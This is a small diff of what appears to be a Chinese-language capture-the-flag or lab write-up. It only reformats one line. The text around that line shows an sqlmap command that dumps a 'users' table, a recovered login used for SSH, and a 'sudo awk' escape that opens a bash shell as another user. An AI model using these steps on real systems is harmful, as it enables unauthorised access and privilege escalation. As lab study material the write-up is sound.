@@ -31,7 +31,9 @@ nebuladb库中存在3个表: central 、centrals 、 users
 sqlmap -r req.txt --batch -D nebuladb -T users --dump
 ```
 
-发现 pmccentral:999999999 可登陆 ssh。 sudo -l 显示 awk，可切换到另外一个用户 laboratoryadmin:
+发现 pmccentral:999999999 可登陆 ssh。
+
+sudo -l 显示 awk，可切换到另外一个用户 laboratoryadmin:
 
 ```
 sudo -u laboratoryadmin awk 'BEGIN {system("/bin/bash")}'
